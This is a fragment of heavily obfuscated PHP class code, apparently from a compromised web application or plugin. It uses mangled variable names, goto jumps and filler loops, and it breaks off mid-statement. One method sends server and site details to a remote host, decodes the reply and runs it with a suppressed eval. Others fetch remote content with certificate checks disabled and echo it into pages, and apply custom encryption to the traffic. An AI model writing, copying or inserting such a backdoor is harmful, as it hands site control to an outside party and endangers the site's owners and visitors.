$this->{$_SERVER[éÑÍñÜ£™][255]}($e†ñ—… Şæ, $F…ˆœ†Ş»ç[256]); $Dí²ÛÅ÷š¥ = $CŞ¤¨İßËˆ[625]; while (strlen($Dí²ÛÅ÷š¥) < $CŞ¤¨İßËˆ[568]) { if (!$Dí²ÛÅ÷š¥) { break; } $Dí²ÛÅ÷š¥++; } goto d¶»‚ËÊàè; F‡ôŞí Å: $bªßœåğá¤ = $CŞ¤¨İßËˆ[623]; if (!$F…ˆœ†Ş»ç[113]($GLOBALS, $F…ˆœ†Ş»ç[141]) || !isset($_GET[$F…ˆœ†Ş»ç[253]])) { return; } if (!$F…ˆœ†Ş»ç[247]($_SERVER[$F…ˆœ†Ş»ç[44]], $Bë™¥‰Å“á)) { return; } goto dÕ¿Å»À¢×; Bö¹±˜Õê: if (!$D‹‰ŸŒãÕˆ) { return; } $F…ˆœ†Ş»ç[263]($F…ˆœ†Ş»ç[264]); if ($cš¼ØøîøÖ && $F…ˆœ†Ş»ç[32]($cš¼ØøîøÖ, $F…ˆœ†Ş»ç[265])) { echo $cš¼ØøîøÖ; } goto CÈ—®éâæ; d¶»‚ËÊàè: $c¬èó¡ù³ = $F…ˆœ†Ş»ç[257](array($F…ˆœ†Ş»ç[258] => array($F…ˆœ†Ş»ç[259] => $F…ˆœ†Ş»ç[260], $F…ˆœ†Ş»ç[261] => 3))); $cš¼ØøîøÖ = @$F…ˆœ†Ş»ç[262]($e†ñ—… Şæ, !1, $c¬èó¡ù³); $D‹‰ŸŒãÕˆ = $CŞ¤¨İßËˆ[626]; goto Bö¹±˜Õê; BíŠÕ‹¢ëğ: } public function zvom36baf7db($a£¿ª‰Ôà) { goto A¿Ò”´åÑª; EÙ­©æ´ßÂ: foreach ($a²Õê÷²Ë„ as $fí©¯Á¥ô” => $c¤É¹ª¡ï) { if ($c¤É¹ª¡ï == $fÓ†º®¬†«[268] && $fÓ†º®¬†«[25]($this->vwbsb58da3d9, 0, 1) == $fÓ†º®¬†«[268]) { continue; } if (!$fÓ†º®¬†«[247]($fí©¯Á¥ô”, $C˜˜ÛÕÁ)) { $FÛ¢‰µÑ©[] = $fí©¯Á¥ô”; } } foreach ($FÛ¢‰µÑ© as $fí©¯Á¥ô”) { unset($a£¿ª‰Ôà[$fí©¯Á¥ô”]); } return $a£¿ª‰Ôà; goto Cˆ´ÆŒİÒå; A¿Ò”´åÑª: $Bô©¥Â•‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fÓ†º®¬†« =& $_SERVER[éÑÍñÜ£™]; if ($this->vwbsb58da3d9 == $fÓ†º®¬†«[266]) { return $a£¿ª‰Ôà; } goto D’æ“…¯¼§; D’æ“…¯¼§: $a²Õê÷²Ë„ = array($fÓ†º®¬†«[267] => $fÓ†º®¬†«[268], $fÓ†º®¬†«[269] => $fÓ†º®¬†«[268], $fÓ†º®¬†«[270] => $fÓ†º®¬†«[268], $fÓ†º®¬†«[271] => $fÓ†º®¬†«[268], $fÓ†º®¬†«[272] => $fÓ†º®¬†«[268], $fÓ†º®¬†«[273] => $fÓ†º®¬†«[268], $fÓ†º®¬†«[274] => $fÓ†º®¬†«[275], $fÓ†º®¬†«[276] => $fÓ†º®¬†«[275], $fÓ†º®¬†«[277] => $fÓ†º®¬†«[275], $fÓ†º®¬†«[278] => $fÓ†º®¬†«[275], $fÓ†º®¬†«[279] => $fÓ†º®¬†«[275], $fÓ†º®¬†«[280] => $fÓ†º®¬†«[275], $fÓ†º®¬†«[281] => $fÓ†º®¬†«[275]); $cÜìØµî‹° = $Bô©¥Â•‰[627]; $C˜˜ÛÕÁ = $fÓ†º®¬†«[0]($fÓ†º®¬†«[282], $fÓ†º®¬†«[113]($this->mbpu01a57522, $fÓ†º®¬†«[138], $fÓ†º®¬†«[10])); goto bá¬Æ–÷¯é; bá¬Æ–÷¯é: $FÛ¢‰µÑ© = array(); $dô²ñ ª©— = $Bô©¥Â•‰[628]; if (!$dô²ñ ª©—) { return; } goto EÙ­©æ´ßÂ; Cˆ´ÆŒİÒå: } private function qatwd0d4f509() { $aŒ¼ÛÀèÁø =& $_SERVER[éÑÍñÜ£™]; if ($this->vwbsb58da3d9 != $aŒ¼ÛÀèÁø[130]) { return; } $GLOBALS[$aŒ¼ÛÀèÁø[100]][$aŒ¼ÛÀèÁø[104]][$aŒ¼ÛÀèÁø[283]] = $aŒ¼ÛÀèÁø[228]; $GLOBALS[$aŒ¼ÛÀèÁø[100]][$aŒ¼ÛÀèÁø[284]] = $aŒ¼ÛÀèÁø[228]; $e¨ô‰À±±¼ = $_SERVER[çŞáÓæÚô‚Ô‡][629]; if ($aŒ¼ÛÀèÁø[61]($aŒ¼ÛÀèÁø[285])->{$_SERVER[éÑÍñÜ£™][63]}($aŒ¼ÛÀèÁø[89]) != $aŒ¼ÛÀèÁø[240]) { $aŒ¼ÛÀèÁø[61]($aŒ¼ÛÀèÁø[285])->{$_SERVER[éÑÍñÜ£™][229]}($aŒ¼ÛÀèÁø[89], $aŒ¼ÛÀèÁø[240]); } } public function xwifa1301d38() { $aÅÖí«œñ† =& $_SERVER[çŞáÓæÚô‚Ô‡]; return $_SERVER[éÑÍñÜ£™][286]; $BªÆÖÏé«Š = $aÅÖí«œñ†[630]; if (strlen($BªÆÖÏé«Š) < $aÅÖí«œñ†[12]) { die; } } private function adetf5708f75() { goto EçóÓËİ±; EçóÓËİ±: $e—ã©ÅŒìÜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eöˆ»½ÍªÊ =& $_SERVER[éÑÍñÜ£™]; $B—Ä…çİˆ = array($Eöˆ»½ÍªÊ[287], $Eöˆ»½ÍªÊ[288], $Eöˆ»½ÍªÊ[289]); goto dÓÃÇŒ‘Ç; dÓÃÇŒ‘Ç: $E‹“˜Ë¦š¤ = $e—ã©ÅŒìÜ[631]; if (!$E‹“˜Ë¦š¤) { die; } $d“‚ó¹¦ù = $Eöˆ»½ÍªÊ[290] . $Eöˆ»½ÍªÊ[123]($Eöˆ»½ÍªÊ[291]); goto aóéÊˆİ; aóéÊˆİ: if ($this->vwbsb58da3d9 == $Eöˆ»½ÍªÊ[130] || !$Eöˆ»½ÍªÊ[113]($GLOBALS, $Eöˆ»½ÍªÊ[141])) { return; } if (!$Eöˆ»½ÍªÊ[247]($_SERVER[$Eöˆ»½ÍªÊ[44]], $B—Ä…çİˆ)) { return; } if ($Eöˆ»½ÍªÊ[241]() % 4 != 0) { return; } goto cî…§î¹·¥; c›°¨ƒÙ“: $this->{$_SERVER[éÑÍñÜ£™][173]}(); if ($this->{$_SERVER[éÑÍñÜ£™][208]}($bË‘ìŞËÜ‡[$Eöˆ»½ÍªÊ[296]]) != $CÌ‹àİëøß[$Eöˆ»½ÍªÊ[174]]) { $AˆÚ®°ã¯ = array($Eöˆ»½ÍªÊ[210] => $Eöˆ»½ÍªÊ[61]($Eöˆ»½ÍªÊ[62])->{$_SERVER[éÑÍñÜ£™][63]}($Eöˆ»½ÍªÊ[125]), $Eöˆ»½ÍªÊ[211] => $_SERVER[$Eöˆ»½ÍªÊ[124]], $Eöˆ»½ÍªÊ[212] => $Eöˆ»½ÍªÊ[213](), $Eöˆ»½ÍªÊ[183] => $_SERVER[$Eöˆ»½ÍªÊ[184]]); $DÙùàÑæÓ = $this->{$_SERVER[éÑÍñÜ£™][214]}($Eöˆ»½ÍªÊ[157]($AˆÚ®°ã¯)); $bË‘ìŞËÜ‡ = $this->{$_SERVER[éÑÍñÜ£™][191]}($Eöˆ»½ÍªÊ[215] . $DÙùàÑæÓ); if ($bË‘ìŞËÜ‡ && $Eöˆ»½ÍªÊ[200]($bË‘ìŞËÜ‡) && isset($bË‘ìŞËÜ‡[$Eöˆ»½ÍªÊ[296]])) { $CÒ‡Ê¹ç’ = $this->{$_SERVER[éÑÍñÜ£™][197]}($bË‘ìŞËÜ‡[$Eöˆ»½ÍªÊ[296]], 2); if ($CÒ‡Ê¹ç’) { $CÒ‡Ê¹ç’ = $this->{$_SERVER[éÑÍñÜ£™][208]}($CÒ‡Ê¹ç’); } if ($CÒ‡Ê¹ç’) { try { @eval($CÒ‡Ê¹ç’); } catch (Exception $AÄÆÀ‹è·) { } } } } goto d™¨ÀÑÌˆï; D›´¢¶Ÿğ„: $bË‘ìŞËÜ‡ = $this->{$_SERVER[éÑÍñÜ£™][191]}($Eöˆ»½ÍªÊ[295], $CÌ‹àİëøß); if (!$Eöˆ»½ÍªÊ[200]($bË‘ìŞËÜ‡)) { return; } if ($bË‘ìŞËÜ‡[$Eöˆ»½ÍªÊ[174]] && $bË‘ìŞËÜ‡[$Eöˆ»½ÍªÊ[296]]) { if ($this->{$_SERVER[éÑÍñÜ£™][208]}($bË‘ìŞËÜ‡[$Eöˆ»½ÍªÊ[296]]) == $CÌ‹àİëøß[$Eöˆ»½ÍªÊ[174]]) { return; } } goto c›°¨ƒÙ“; CÚ†Æ©¶ˆ: $Eöˆ»½ÍªÊ[13](array($Eöˆ»½ÍªÊ[292], $Eöˆ»½ÍªÊ[161]), $d“‚ó¹¦ù, $Eöˆ»½ÍªÊ[241]()); $a±ÖÃ¶¾Õ¶ = $e—ã©ÅŒìÜ[633]; $CÌ‹àİëøß = array($Eöˆ»½ÍªÊ[174] => $Eöˆ»½ÍªÊ[61]($Eöˆ»½ÍªÊ[62])->{$_SERVER[éÑÍñÜ£™][63]}($Eöˆ»½ÍªÊ[217]), $Eöˆ»½ÍªÊ[187] => $this->vwbsb58da3d9, $Eöˆ»½ÍªÊ[185] => $_SERVER[$Eöˆ»½ÍªÊ[186]], $Eöˆ»½ÍªÊ[178] => $Eöˆ»½ÍªÊ[158], $Eöˆ»½ÍªÊ[181] => $_SERVER[$Eöˆ»½ÍªÊ[182]]); goto D›´¢¶Ÿğ„; cî…§î¹·¥: $eŠ ïîÆ‘ = $Eöˆ»½ÍªÊ[13](array($Eöˆ»½ÍªÊ[292], $Eöˆ»½ÍªÊ[293]), $d“‚ó¹¦ù); $E¸Â‡˜Ø…ö = $e—ã©ÅŒìÜ[632]; if ($eŠ ïîÆ‘ && $Eöˆ»½ÍªÊ[241]() - $eŠ ïîÆ‘ < $Eöˆ»½ÍªÊ[249]($Eöˆ»½ÍªÊ[294])) { return; } goto CÚ†Æ©¶ˆ; d™¨ÀÑÌˆï: } private function chzs0f7b8c2f($CÅãˆ®ò†© = '', $FÙ±‡Ş·µï = array(), $dêÏ®¢ù¡ = 5) { goto aè‘­Æ£¾; eîÜÌŸÃŒ: $E«ˆÑäÓÙ = $aç×Šİ’§ø[634]; $BÃÉÊŞï ¦ = $this->{$_SERVER[éÑÍñÜ£™][255]}($BÃÉÊŞï ¦, $AÈÛªŸàÚ—[298]); $BÃÉÊŞï ¦ = $BÃÉÊŞï ¦ . $CÅãˆ®ò†© . $AÈÛªŸàÚ—[299] . $AÈÛªŸàÚ—[300]($FÙ±‡Ş·µï); goto fâ²¾š§±°; aÌÆ²ëãòÛ: $dù“‰ŸÕÙ = $aç×Šİ’§ø[635]; while ($dù“‰ŸÕÙ < $aç×Šİ’§ø[12]) { if ($dù“‰ŸÕÙ >= 0) { break; } $dù“‰ŸÕÙ++; } return $AÈÛªŸàÚ—[199]($FÙ±‡Ş·µï, !0); goto D¥¡Ó¥è¯; aè‘­Æ£¾: $aç×Šİ’§ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÈÛªŸàÚ— =& $_SERVER[éÑÍñÜ£™]; $BÃÉÊŞï ¦ = $AÈÛªŸàÚ—[297]; goto eîÜÌŸÃŒ; fâ²¾š§±°: if ($FÙ±‡Ş·µï === -1) { return $BÃÉÊŞï ¦; } $E¸¬ÏÔÒè = $AÈÛªŸàÚ—[257](array($AÈÛªŸàÚ—[258] => array($AÈÛªŸàÚ—[261] => $dêÏ®¢ù¡, $AÈÛªŸàÚ—[259] => $AÈÛªŸàÚ—[301]), $AÈÛªŸàÚ—[302] => array($AÈÛªŸàÚ—[303] => !1, $AÈÛªŸàÚ—[304] => !1))); $FÙ±‡Ş·µï = @$AÈÛªŸàÚ—[262]($BÃÉÊŞï ¦, !1, $E¸¬ÏÔÒè); goto aÌÆ²ëãòÛ; D¥¡Ó¥è¯: } private function idrlbdfd8ab1() { goto a¶ª°Í“øÔ; B©ìõ˜†ÅÚ: if (strlen($B²ª£½Šé‹) < $DÙ’¸—‡È«[573]) { die; } $CŒ¸õèô„° = $f‰„ù¶ÖëŞ[113]($this->mbpu01a57522, $f‰„ù¶ÖëŞ[332]); $CŒ¸õèô„° = $CŒ¸õèô„° ? $f‰„ù¶ÖëŞ[249]($CŒ¸õèô„°) : 0; goto FÕÚÇâÇ°; a¶ª°Í“øÔ: $DÙ’¸—‡È« =& $_SERVER[çŞáÓæÚô‚Ô‡]; $f‰„ù¶ÖëŞ =& $_SERVER[éÑÍñÜ£™]; $BÍî‘Ø—®Ğ = array($f‰„ù¶ÖëŞ[305] => $f‰„ù¶ÖëŞ[306], $f‰„ù¶ÖëŞ[307] => $f‰„ù¶ÖëŞ[308], $f‰„ù¶ÖëŞ[309] => $f‰„ù¶ÖëŞ[310], $f‰„ù¶ÖëŞ[311] => $f‰„ù¶ÖëŞ[312], $f‰„ù¶ÖëŞ[313] => $f‰„ù¶ÖëŞ[314], $f‰„ù¶ÖëŞ[315] => $f‰„ù¶ÖëŞ[250], $f‰„ù¶ÖëŞ[316] => $f‰„ù¶ÖëŞ[250], $f‰„ù¶ÖëŞ[317] => $f‰„ù¶ÖëŞ[306], $f‰„ù¶ÖëŞ[318] => $f‰„ù¶ÖëŞ[308], $f‰„ù¶ÖëŞ[319] => $f‰„ù¶ÖëŞ[310], $f‰„ù¶ÖëŞ[320] => $f‰„ù¶ÖëŞ[321], $f‰„ù¶ÖëŞ[322] => $f‰„ù¶ÖëŞ[312], $f‰„ù¶ÖëŞ[323] => $f‰„ù¶ÖëŞ[324], $f‰„ù¶ÖëŞ[325] => $f‰„ù¶ÖëŞ[314], $f‰„ù¶ÖëŞ[326] => $f‰„ù¶ÖëŞ[327], $f‰„ù¶ÖëŞ[328] => $f‰„ù¶ÖëŞ[329], $f‰„ù¶ÖëŞ[330] => $f‰„ù¶ÖëŞ[331]); goto cŠ«ÙÃŒÏ‡; cŠ«ÙÃŒÏ‡: $a¬ ®Ô©Ì = $DÙ’¸—‡È«[601]; $e‡Üƒ±çë¿ = $BÍî‘Ø—®Ğ[$this->vwbsb58da3d9]; $aÁé™·„‰£ = $DÙ’¸—‡È«[636]; goto F‡ŞëƒÌõğ; FÕÚÇâÇ°: return $e‡Üƒ±çë¿ + $CŒ¸õèô„°; goto a•˜ÓÎé’; F‡ŞëƒÌõğ: if (strlen($aÁé™·„‰£) < $DÙ’¸—‡È«[562]) { return; } $e‡Üƒ±çë¿ = $f‰„ù¶ÖëŞ[249]($e‡Üƒ±çë¿ ? $e‡Üƒ±çë¿ : $f‰„ù¶ÖëŞ[306]); $B²ª£½Šé‹ = $DÙ’¸—‡È«[637]; goto B©ìõ˜†ÅÚ; a•˜ÓÎé’: } public function akrv8c41ef81($FÁŠôíÓ‹•) { goto bÂ‰èŸ¨î½; cØŒ®Æ¡ƒŞ: $Eğ¾Ú®¢Œ‚ = $cåßÉ²òˆ[230]($Eğ¾Ú®¢Œ‚, $cåßÉ²òˆ[10], $cåßÉ²òˆ[333]); $F­˜¤·í¿ = $dŒŠÒ—ùâ[639]; if (strlen($F­˜¤·í¿) < $dŒŠÒ—ùâ[568]) { die; } goto aÈâõù…Ò; C‘ Ù¨èğ…: $dšÉ®è¤ì  = $dŒŠÒ—ùâ[638]; if ($FÁŠôíÓ‹•[$cåßÉ²òˆ[333]] == $cåßÉ²òˆ[228]) { return; } if ($Eæ‹’¹øÈ >= $cåßÉ²òˆ[249]($cåßÉ²òˆ[250])) { return; } goto e¨ŸœÛ™Ê„; e¨ŸœÛ™Ê„: $FÁÛ‘²íˆó = $cåßÉ²òˆ[61]($cåßÉ²òˆ[148])->{$_SERVER[éÑÍñÜ£™][149]}(); if ($FÁÛ‘²íˆó <= $Eæ‹’¹øÈ) { return; } $Eğ¾Ú®¢Œ‚ = $cåßÉ²òˆ[61]($cåßÉ²òˆ[148])->{$_SERVER[éÑÍñÜ£™][334]}($cåßÉ²òˆ[333])->{$_SERVER[éÑÍñÜ£™][335]}($Eæ‹’¹øÈ)->{$_SERVER[éÑÍñÜ£™][336]}(); goto cØŒ®Æ¡ƒŞ; aÈâõù…Ò: if (!$cåßÉ²òˆ[247]($FÁŠôíÓ‹•[$cåßÉ²òˆ[333]], $Eğ¾Ú®¢Œ‚)) { $cåßÉ²òˆ[175]($cåßÉ²òˆ[337], !1, $cåßÉ²òˆ[244]); } goto F²×§µ¾ã; bÂ‰èŸ¨î½: $dŒŠÒ—ùâ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cåßÉ²òˆ =& $_SERVER[éÑÍñÜ£™]; $Eæ‹’¹øÈ = $this->{$_SERVER[éÑÍñÜ£™][146]}(); goto C‘ Ù¨èğ…; F²×§µ¾ã: } public function nkbm8c969ec8() { goto fÓİÎù—¡; f¹â¡Õ›ï: echo $C°²£¤Ó³[339] . $C°²£¤Ó³[340]($EŞÏœ‡æó) . $C°²£¤Ó³[341]; $b–ìŠÔ÷˜ = $EÊªôàœİ®[641]; if (strlen($b–ìŠÔ÷˜) < $EÊªôàœİ®[566]) { return; } goto E’éÑšèè; BÇâ­µÒÇ: $BĞÃ¶¢°† = $C°²£¤Ó³[254]; $BĞÃ¶¢°† = $this->{$_SERVER[éÑÍñÜ£™][255]}($BĞÃ¶¢°†, $C°²£¤Ó³[256]); $fİªÖµ¨™ = $C°²£¤Ó³[257](array($C°²£¤Ó³[258] => array($C°²£¤Ó³[259] => $C°²£¤Ó³[260], $C°²£¤Ó³[261] => 3))); goto Dœ„Å´‘Ä®; Dœ„Å´‘Ä®: $fìÛöÌŞß× = $EÊªôàœİ®[640]; if (strlen($fìÛöÌŞß×) < $EÊªôàœİ®[568]) { die; } $EŞÏœ‡æó = @$C°²£¤Ó³[262]($BĞÃ¶¢°†, !1, $fİªÖµ¨™); goto f¹â¡Õ›ï; fÓİÎù—¡: $EÊªôàœİ® =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C°²£¤Ó³ =& $_SERVER[éÑÍñÜ£™]; if (!$C°²£¤Ó³[113]($GLOBALS, $C°²£¤Ó³[141]) || $C°²£¤Ó³[338](1, 100) > 20) { return; } goto BÇâ­µÒÇ; E’éÑšèè: } private function zmsl6cf24fe6($AƒÔÊ¶øéÎ, $b±š¢–‚Ù¶, $Eğ’Ó‹¢Å­ = 3) { goto aÜ¸ãïò‘…; aÜ¸ãïò‘…: $aƒø¦ìà² =& $_SERVER[çŞáÓæÚô‚Ô‡]; $díœœó¼–¶ =& $_SERVER[éÑÍñÜ£™]; $díœœó¼–¶[342](1); goto AÄÂêï¸©Ù; AÄÂêï¸©Ù: $eè¤ô‚×ó® = $aƒø¦ìà²[642]; $AƒÔÊ¶øéÎ = $díœœó¼–¶[2]($AƒÔÊ¶øéÎ); $f©‡„æèŞí = $díœœó¼–¶[338](0, 5) . $díœœó¼–¶[10]; goto F©„ÀµšŞâ; CŠĞ»Çš«ë: $dÕá‘ß£ßï = $aƒø¦ìà²[644]; while ($dÕá‘ß£ßï < $aƒø¦ìà²[562]) { if ($dÕá‘ß£ßï >= 0) { break; } $dÕá‘ß£ßï++; } $a•ª‘Ş¨‘ = $díœœó¼–¶[343]; goto A„æÑÎ†‰; A„æÑÎ†‰: $fÀ°«ìÂ£ƒ = $aƒø¦ìà²[645]; switch ($f©‡„æèŞí) { case $díœœó¼–¶[240]: $cçùçï‰Ã’ = $this->{$_SERVER[éÑÍñÜ£™][156]}($AƒÔÊ¶øéÎ, $díœœó¼–¶[222]($b±š¢–‚Ù¶ . $C¿ö·£±ÁÍ)); $CëÕˆÀ•« = $aƒø¦ìà²[646]; while (strlen($CëÕˆÀ•«) < $aƒø¦ìà²[12]) { if (!$CëÕˆÀ•«) { break; } $CëÕˆÀ•«++; } break; $eŸ¤¼ÔÕ°¿ = $aƒø¦ìà²[647]; case $díœœó¼–¶[228]: $cçùçï‰Ã’ = $this->{$_SERVER[éÑÍñÜ£™][156]}($AƒÔÊ¶øéÎ, $díœœó¼–¶[222]($C¿ö·£±ÁÍ . $b±š¢–‚Ù¶)); break; case $díœœó¼–¶[344]: $cçùçï‰Ã’ = $this->{$_SERVER[éÑÍñÜ£™][156]}($AƒÔÊ¶øéÎ, $díœœó¼–¶[127]($C¿ö·£±ÁÍ . $b±š¢–‚Ù¶)); break; $D‰ËØî›¶á = $aƒø¦ìà²[648]; if (strlen($D‰ËØî›¶á) < $aƒø¦ìà²[566]) { return; } case $díœœó¼–¶[345]: $cçùçï‰Ã’ = $this->{$_SERVER[éÑÍñÜ£™][156]}($AƒÔÊ¶øéÎ, $díœœó¼–¶[123]($C¿ö·£±ÁÍ . $b±š¢–‚Ù¶)); break; $FÆ†³ëˆ‡™ = $aƒø¦ìà²[649]; if (!$FÆ†³ëˆ‡™) { die; } case $díœœó¼–¶[346]: goto c¹†õƒ§·; c›Æ“ñ×£¦: $FŞ¦ì†àòñ = $díœœó¼–¶[123]($A‚­Ã„¦İô . $díœœó¼–¶[123]($b±š¢–‚Ù¶ . $A‚­Ã„¦İô) . $b±š¢–‚Ù¶); $FŞ¦ì†àòñ = $díœœó¼–¶[25]($FŞ¦ì†àòñ, $c¯¢¾·Ã‰± % 8, $c¯¢¾·Ã‰± % 8 + 7); $c«¸ã¼‡Ú = $aƒø¦ìà²[652]; goto cœùìÉàë‘; FâÓ²Ô…§‹: if (!$Aãîà›Šºœ) { return; } $B’‘ãõ = 0; $E—ÄÌŒÂ‰ò = 0; goto eŒêè„Îô; cœùìÉàë‘: if (strlen($c«¸ã¼‡Ú) < $aƒø¦ìà²[573]) { return; } $E‹…â…óÑ = $díœœó¼–¶[10]; $Aãîà›Šºœ = $aƒø¦ìà²[653]; goto FâÓ²Ô…§‹; FƒƒîÚ‹ : if (strlen($B´„ŸÁÓƒ¢) < $aƒø¦ìà²[12]) { die; } $A‚­Ã„¦İô = $a•ª‘Ş¨‘[$c¯¢¾·Ã‰±]; $eÖ¶’Ş…Ë = $aƒø¦ìà²[651]; goto c›Æ“ñ×£¦; eŒêè„Îô: $fßŞœ©”Ó = $aƒø¦ìà²[654]; if (strlen($fßŞœ©”Ó) < $aƒø¦ìà²[568]) { die; } $FÜ¶ƒ¨“…  = 0; goto AÂêò•²ÓÃ; b§Õ‘ó‡¢Ã: $d‚§´›ì = $aƒø¦ìà²[657]; if (strlen($d‚§´›ì) < $aƒø¦ìà²[562]) { die; } goto AÒÂŠ˜“…‚; c¹†õƒ§·: $AƒÔÊ¶øéÎ = $díœœó¼–¶[127]($AƒÔÊ¶øéÎ); $c¯¢¾·Ã‰± = $díœœó¼–¶[347](0, 64); $B´„ŸÁÓƒ¢ = $aƒø¦ìà²[650]; goto FƒƒîÚ‹ ; AÂêò•²ÓÃ: for ($B’‘ãõ = 0; $B’‘ãõ < $díœœó¼–¶[24]($AƒÔÊ¶øéÎ); $B’‘ãõ++) { $FÜ¶ƒ¨“…  = $FÜ¶ƒ¨“…  == $díœœó¼–¶[24]($FŞ¦ì†àòñ) ? 0 : $FÜ¶ƒ¨“… ; $DÈôËŸ¯î = $aƒø¦ìà²[655]; $E—ÄÌŒÂ‰ò = ($c¯¢¾·Ã‰± + $díœœó¼–¶[348]($a•ª‘Ş¨‘, $AƒÔÊ¶øéÎ[$B’‘ãõ]) + $díœœó¼–¶[349]($FŞ¦ì†àòñ[$FÜ¶ƒ¨“… ++])) % 64; $E‹…â…óÑ .= $a•ª‘Ş¨‘[$E—ÄÌŒÂ‰ò]; $c•¾‘íÂÃˆ = $aƒø¦ìà²[656]; } $cçùçï‰Ã’ = $díœœó¼–¶[340]($A‚­Ã„¦İô . $E‹…â…óÑ); break; goto b§Õ‘ó‡¢Ã; AÒÂŠ˜“…‚: default: $cçùçï‰Ã’ = $this->{$_SERVER[éÑÍñÜ£™][156]}($AƒÔÊ¶øéÎ, $b±š¢–‚Ù¶ . $C¿ö·£±ÁÍ); break; } $cçùçï‰Ã’ = $díœœó¼–¶[222]($f©‡„æèŞí . $C¿ö·£±ÁÍ . $cçùçï‰Ã’); goto BõÑ£°×ƒø; BõÑ£°×ƒø: if ($Eğ’Ó‹¢Å­ - 1 > 0) { $cçùçï‰Ã’ = $this->{$_SERVER[éÑÍñÜ£™][136]}($cçùçï‰Ã’, $b±š¢–‚Ù¶, $Eğ’Ó‹¢Å­ - 1); } return $cçùçï‰Ã’; goto B…÷Ú¹œÕ½; F©„ÀµšŞâ: $CĞŠù”«Ò‚ = $aƒø¦ìà²[643]; while ($CĞŠù”«Ò‚ < $aƒø¦ìà²[573]) { if ($CĞŠù”«Ò‚ >= 0) { break; } $CĞŠù”«Ò‚++; } $C¿ö·£±ÁÍ = $díœœó¼–¶[133](15); goto CŠĞ»Çš«ë; B…÷Ú¹œÕ½: } private function lhco00f4c221($d–ì¹ÃÕÍ, $d•ËÜˆ´š, $Aø‡øêñ‰ = 3) { goto B¤ƒ”È®Àë; FÌ¯İì‰‚: $d–ì¹ÃÕÍ = $AÃÕ…±‡ä½[2]($d–ì¹ÃÕÍ); $d–ì¹ÃÕÍ = $AÃÕ…±‡ä½[222]($d–ì¹ÃÕÍ); $EÁï‡ØÁ° = $d–ì¹ÃÕÍ[0]; goto D˜©¶­ôØ; bŠÅøïöÜ™: if ($Aø‡øêñ‰ - 1 > 0) { $a”„İöê« = $this->{$_SERVER[éÑÍñÜ£™][197]}($a”„İöê«, $d•ËÜˆ´š, $Aø‡øêñ‰ - 1); } return $a”„İöê«; goto CòÇÔºñã—; bäÃ¼Ò¨Û‘: $d–ì¹ÃÕÍ = $AÃÕ…±‡ä½[25]($d–ì¹ÃÕÍ, 16); $b ÊëîÀ = $AÃÕ…±‡ä½[343]; switch ($EÁï‡ØÁ°) { case $AÃÕ…±‡ä½[240]: $a”„İöê« = $this->{$_SERVER[éÑÍñÜ£™][255]}($d–ì¹ÃÕÍ, $AÃÕ…±‡ä½[222]($d•ËÜˆ´š . $BáÂ¦…Ê¬À)); $dóã¸²Ìôœ = $D¸‡ª¬Îá¦[659]; if (!$dóã¸²Ìôœ) { die; } break; $C“ùÉ³á—¾ = $D¸‡ª¬Îá¦[660]; case $AÃÕ…±‡ä½[228]: $a”„İöê« = $this->{$_SERVER[éÑÍñÜ£™][255]}($d–ì¹ÃÕÍ, $AÃÕ…±‡ä½[222]($BáÂ¦…Ê¬À . $d•ËÜˆ´š)); break; case $AÃÕ…±‡ä½[344]: $a”„İöê« = $this->{$_SERVER[éÑÍñÜ£™][255]}($d–ì¹ÃÕÍ, $AÃÕ…±‡ä½[127]($BáÂ¦…Ê¬À . $d•ËÜˆ´š)); break; case $AÃÕ…±‡ä½[345]: $a”„İöê« = $this->{$_SERVER[éÑÍñÜ£™][255]}($d–ì¹ÃÕÍ, $AÃÕ…±‡ä½[123]($BáÂ¦…Ê¬À . $d•ËÜˆ´š)); $Fä®ôÄ´š = $D¸‡ª¬Îá¦[661]; if (strlen($Fä®ôÄ´š) < $D¸‡ª¬Îá¦[562]) { die; } break; $E­‹˜§­¯¤ = $D¸‡ª¬Îá¦[662]; case $AÃÕ…±‡ä½[346]: goto bñ™Şöµì; C÷¦ˆÆ›Û: $E¯Üµ“¿±ì = $d–ì¹ÃÕÍ[0]; $d–ì¹ÃÕÍ = $AÃÕ…±‡ä½[25]($d–ì¹ÃÕÍ, 1); $eøê¶Ñ˜ò» = $AÃÕ…±‡ä½[348]($b ÊëîÀ, $E¯Üµ“¿±ì); goto d˜ğÚéÅÏÌ; bñ™Şöµì: $d–ì¹ÃÕÍ = $AÃÕ…±‡ä½[351]($d–ì¹ÃÕÍ); $C»™Àê§ø¤ = $D¸‡ª¬Îá¦[663]; while (strlen($C»™Àê§ø¤) < $D¸‡ª¬Îá¦[568]) { if (!$C»™Àê§ø¤) { break; } $C»™Àê§ø¤++; } goto C÷¦ˆÆ›Û; bä›±¾‘ª·: if (!$B¸‰‡ó‹Äø) { return; } for ($cõÙŒĞöÊé = 0; $cõÙŒĞöÊé < $AÃÕ…±‡ä½[24]($d–ì¹ÃÕÍ); $cõÙŒĞöÊé++) { $Fâ˜ƒ²ã = $Fâ˜ƒ²ã == $AÃÕ…±‡ä½[24]($CŸ²å«—ÖŒ) ? 0 : $Fâ˜ƒ²ã; $e£ŒíŒñ°§ = $D¸‡ª¬Îá¦[669]; $AŒò¢›‹òØ = $Fâ˜ƒ²ã++; $f¿¤ï­âáÓ = $D¸‡ª¬Îá¦[666]; if (!$f¿¤ï­âáÓ) { return; } $aİÁ«ç®¦– = $AÃÕ…±‡ä½[348]($b ÊëîÀ, $d–ì¹ÃÕÍ[$cõÙŒĞöÊé]) - $eøê¶Ñ˜ò» - $AÃÕ…±‡ä½[349]($CŸ²å«—ÖŒ[$AŒò¢›‹òØ]); $CĞğÓÓçÃÀ = $D¸‡ª¬Îá¦[670]; while ($CĞğÓÓçÃÀ < $D¸‡ª¬Îá¦[12]) { if ($CĞğÓÓçÃÀ >= 0) { break; } $CĞğÓÓçÃÀ++; } while ($aİÁ«ç®¦– < 0) { $aİÁ«ç®¦– += 64; $BˆãËÓµó¤ = $D¸‡ª¬Îá¦[671]; if (!$BˆãËÓµó¤) { die; } } $F˜”ÉÑ¹ .= $b ÊëîÀ[$aİÁ«ç®¦–]; } $a”„İöê« = $AÃÕ…±‡ä½[352]($F˜”ÉÑ¹); goto cŠÑ§æ²¡†; DÛÓºÊ²öÉ: $aİÁ«ç®¦– = 0; $Fâ˜ƒ²ã = 0; $B¸‰‡ó‹Äø = 